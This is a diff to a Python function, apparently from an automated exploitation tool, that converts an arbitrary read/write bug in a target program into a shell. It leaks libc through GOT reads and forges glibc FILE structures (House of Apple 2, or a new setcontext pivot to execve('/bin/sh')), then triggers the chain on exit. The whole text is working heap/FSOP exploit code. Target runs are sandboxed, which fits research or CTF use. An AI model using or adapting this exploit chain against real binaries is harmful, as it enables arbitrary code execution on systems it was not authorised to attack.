@@ -2576,7 +2576,8 @@ def _int_candidates(out: bytes) -> list:
 
 def indexed_write_fsop(exe, workdir, *, write_cell, read_cell, libc_data, leak_slots,
                        scratch: int, exit_seqs=(b"q\n",), marker: bytes = _WWW_MARKER,
-                       timeout: float = 14.0, base_argv=(), mem_mb: int = 2048) -> dict:
+                       plans=("setcontext", "system"), timeout: float = 14.0, base_argv=(),
+                       mem_mb: int = 2048) -> dict:
     """Turn a one-word-at-a-time ARBITRARY WRITE (plus the arbitrary READ that usually comes with
     it) into a spawned shell, with no win function and no `system` in the target's PLT.
 
@@ -2586,93 +2587,138 @@ def indexed_write_fsop(exe, workdir, *, write_cell, read_cell, libc_data, leak_s
       2. the FILE    -- read the forged FILE's own `_wide_data` out of the target rather than
          guessing it, and check the wide `_IO_buf_base` it points at is NULL (the condition
          `_IO_wdoallocbuf` tests). Both are leaks the same primitive already gives us.
-      3. five cells  -- `heap.house_of_apple2_cells`, written in order and each READ BACK, so a
-         cell that did not land is a stated failure rather than a crash at the trigger.
+      3. the cells   -- written in order and each READ BACK, so a cell that did not land is a
+         stated failure rather than a crash at the trigger.
       4. the trigger -- each of `exit_seqs` in turn makes the program return from main, so exit()
-         walks `_IO_list_all` and the forged FILE's overflow is `system(" /bin/sh")`. Several are
-         tried on the SAME live process: the cells are already in place, so a sequence that does
-         not exit costs one prompt rather than a whole run.
+         walks `_IO_list_all` and the forged FILE's overflow runs. Several are tried on the SAME
+         live process: the cells are already in place, so a sequence that does not exit costs one
+         prompt rather than a whole run.
+
+    `plans` are the FSOP payloads to try, in order, each in its OWN process -- a plan that gets
+    part way leaves a half-forged FILE behind, so they cannot share one:
+
+      "setcontext" -- `heap.setcontext_fsop_cells`: the fake `__doallocate` is `setcontext`'s
+                      register-loading entry, which works because `_IO_wdoallocbuf` does
+                      `mov rdx,rdi` first, so the forged FILE is its own ucontext. Full register
+                      control, used here for `execve("/bin/sh", NULL, NULL)`.
+      "system"     -- `heap.house_of_apple2_cells`: the fake `__doallocate` is `system` and the
+                      FILE's `_flags` doubles as the command string.
+
+    setcontext goes first because `execve` beats `system(" /bin/sh")` on both counts that matter
+    here: it needs none of the ~2 KB of stack `system` wants under the pivoted rsp (which lands in
+    libc's `.data`), and it does not need the command to survive in a field that is also a
+    bitfield.
 
     `write_cell(addr, value) -> bytes` and `read_cell(addr) -> bytes` render the target's own input
     for one write / one read; `leak_slots` is [(got_address, libc_symbol_name)] in try order;
     `scratch` is a writable address whose +0x68 may be used for the fake wide jump table (the
     target's own global array). Confirmed by a shell echoing `marker`. Returns
-    {ok, libc_base, fp, cells, reason}."""
+    {ok, plan, plans_tried, libc_base, fp, cells, reason}."""
     from . import heap as _heap
     from . import rop
-    T = _heap.house_of_apple2_cell_targets(libc_data)
-    if not T:
-        return {"ok": False, "reason": "libc lacks _IO_2_1_stderr_/_IO_wfile_jumps/system"}
     syms = rop.libc_symbols(libc_data, tuple({n for _a, n in leak_slots}))
     usable = [(a, n) for a, n in leak_slots if n in syms]
     if not usable:
         return {"ok": False, "reason": "no GOT slot names a symbol the linked libc exports"}
+    targets = {"setcontext": _heap.setcontext_fsop_targets(libc_data),
+               "system": _heap.house_of_apple2_cell_targets(libc_data)}
+    runnable = [k for k in plans if targets.get(k)]
+    if not runnable:
+        return {"ok": False, "reason": "the linked libc supports no FSOP plan "
+                                       f"(wanted {list(plans)}; it lacks the symbols)"}
 
     exedir = str(Path(exe).resolve().parent)
     cmd = sandbox.isolate_prefix(exedir, net=False, rw_binds=[exedir]) + \
         [str(exe)] + [str(a) for a in base_argv]
-    try:
-        p = subprocess.Popen(cmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE,
-                             stderr=subprocess.STDOUT, cwd=exedir, start_new_session=True,
-                             preexec_fn=sandbox._rlimits(mem_mb, int(timeout) + 6, set_as=True))
-    except Exception as e:                               # noqa: BLE001
-        return {"ok": False, "reason": f"spawn failed: {e!r}"}
 
-    def _op(seq, read_secs=0.3):
+    def _attempt(plan: str) -> dict:
+        T = targets[plan]
         try:
-            p.stdin.write(seq)
-            p.stdin.flush()
-        except (BrokenPipeError, OSError):
-            return b""
-        return _read_until(p, time.time() + read_secs, quiet=0.2)
+            p = subprocess.Popen(cmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE,
+                                 stderr=subprocess.STDOUT, cwd=exedir, start_new_session=True,
+                                 preexec_fn=sandbox._rlimits(mem_mb, int(timeout) + 6,
+                                                             set_as=True))
+        except Exception as e:                           # noqa: BLE001
+            return {"ok": False, "reason": f"spawn failed: {e!r}"}
 
-    def _read(addr, secs=0.3):
-        return _int_candidates(_op(read_cell(addr), secs))
+        def _op(seq, read_secs=0.3):
+            try:
+                p.stdin.write(seq)
+                p.stdin.flush()
+            except (BrokenPipeError, OSError):
+                return b""
+            return _read_until(p, time.time() + read_secs, quiet=0.2)
 
-    try:
-        _op(b"", 0.3)                                    # the first prompt
-        base = None
-        for addr, name in usable:
-            for v in _read(addr):
-                base = rop.resolve_libc_base(v, syms[name])
+        def _read(addr, secs=0.3):
+            return _int_candidates(_op(read_cell(addr), secs))
+
+        try:
+            _op(b"", 0.3)                                # the first prompt
+            base = None
+            for addr, name in usable:
+                for v in _read(addr):
+                    base = rop.resolve_libc_base(v, syms[name])
+                    if base:
+                        break
                 if base:
                     break
-            if base:
-                break
-        if not base:
-            return {"ok": False, "reason": "no GOT read resolved a page-aligned libc base "
-                                           "(the slot may still be unresolved / lazily bound)"}
-        fp = base + T["fp"]
-        wide = next((v for v in _read(fp + T["wide_data_field"]) if base <= v < base + 0x600000),
-                    None)
-        if wide is None:
-            return {"ok": False, "libc_base": base,
-                    "reason": f"read of {T['fp_name']}+{T['wide_data_field']:#x} disclosed no "
-                              "libc-range _wide_data pointer"}
-        if 0 not in _read(wide + T["wide_buf_base_field"]):
-            return {"ok": False, "libc_base": base,
-                    "reason": "the forged FILE's wide _IO_buf_base is not NULL, so "
-                              "_IO_wdoallocbuf would not take the allocate path"}
-        cells = _heap.house_of_apple2_cells(fp, wide_data=wide, wide_vtable=scratch,
-                                            wfile_jumps=base + T["wfile_jumps"],
-                                            system=base + T["system"])
-        for addr, val in cells:
-            _op(write_cell(addr, val))
-            if val not in _read(addr):
-                return {"ok": False, "libc_base": base, "cells": [(hex(a), hex(v)) for a, v in cells],
-                        "reason": f"cell {addr:#x} := {val:#x} did not read back; the write "
-                                  "primitive does not reach that address"}
-        for seq in (tuple(exit_seqs) or (b"",)):
-            out = _op(seq, 0.6) if seq else b""
-            out += _op(b"echo " + marker + b"\n", 1.2)
-            if marker in out:
-                return {"ok": True, "libc_base": base, "fp": fp, "wide_data": wide,
-                        "cells": [(hex(a), hex(v)) for a, v in cells], "fp_name": T["fp_name"],
-                        "exit_seq": seq}
-            if p.poll() is not None:
-                break
-        return {"ok": False, "libc_base": base, "cells": [(hex(a), hex(v)) for a, v in cells],
-                "reason": "the five cells landed but no trigger spawned a shell "
-                          f"(exit {p.poll()!r})"}
-    finally:
-        sandbox.kill_quietly(p)
+            if not base:
+                return {"ok": False, "reason": "no GOT read resolved a page-aligned libc base "
+                                               "(the slot may still be unresolved / lazily bound)"}
+            fp = base + T["fp"]
+            wide = next((v for v in _read(fp + T["wide_data_field"])
+                         if base <= v < base + 0x600000), None)
+            if wide is None:
+                return {"ok": False, "libc_base": base,
+                        "reason": f"read of {T['fp_name']}+{T['wide_data_field']:#x} disclosed no "
+                                  "libc-range _wide_data pointer"}
+            if 0 not in _read(wide + T["wide_buf_base_field"]):
+                return {"ok": False, "libc_base": base,
+                        "reason": "the forged FILE's wide _IO_buf_base is not NULL, so "
+                                  "_IO_wdoallocbuf would not take the allocate path"}
+            if plan == "setcontext":
+                flags = next((v for v in _read(fp + T["flags_field"]) if v >> 16 == 0xFBAD), None)
+                if flags is None:
+                    return {"ok": False, "libc_base": base,
+                            "reason": f"read of {T['fp_name']}+0 disclosed no _IO_MAGIC _flags "
+                                      "word, so the bits to turn are not known"}
+                cells = _heap.setcontext_fsop_cells(
+                    fp, flags=flags, wide_data=wide, wide_vtable=scratch,
+                    wfile_jumps=base + T["wfile_jumps"], setcontext=base + T["setcontext"],
+                    fields=T["fields"], rip_at=T["rip_at"], rip=base + T["execve"],
+                    rdi=base + T["binsh"], rsi=0, rdx=0)
+            else:
+                cells = _heap.house_of_apple2_cells(fp, wide_data=wide, wide_vtable=scratch,
+                                                    wfile_jumps=base + T["wfile_jumps"],
+                                                    system=base + T["system"])
+            shown = [(hex(a), hex(v)) for a, v in cells]
+            for addr, val in cells:
+                _op(write_cell(addr, val))
+                if val not in _read(addr):
+                    return {"ok": False, "libc_base": base, "cells": shown,
+                            "reason": f"cell {addr:#x} := {val:#x} did not read back; the write "
+                                      "primitive does not reach that address"}
+            for seq in (tuple(exit_seqs) or (b"",)):
+                out = _op(seq, 0.6) if seq else b""
+                out += _op(b"echo " + marker + b"\n", 1.2)
+                if marker in out:
+                    return {"ok": True, "libc_base": base, "fp": fp, "wide_data": wide,
+                            "cells": shown, "fp_name": T["fp_name"], "exit_seq": seq,
+                            "targets": {k: v for k, v in T.items() if k != "fp_name"}}
+                if p.poll() is not None:
+                    break
+            return {"ok": False, "libc_base": base, "cells": shown,
+                    "reason": f"the {len(cells)} cells landed but no trigger spawned a shell "
+                              f"(exit {p.poll()!r})"}
+        finally:
+            sandbox.kill_quietly(p)
+
+    tried, last = [], None
+    for plan in runnable:
+        last = _attempt(plan)
+        last["plan"] = plan
+        tried.append(plan)
+        if last.get("ok"):
+            break
+    last["plans_tried"] = tried
+    return last
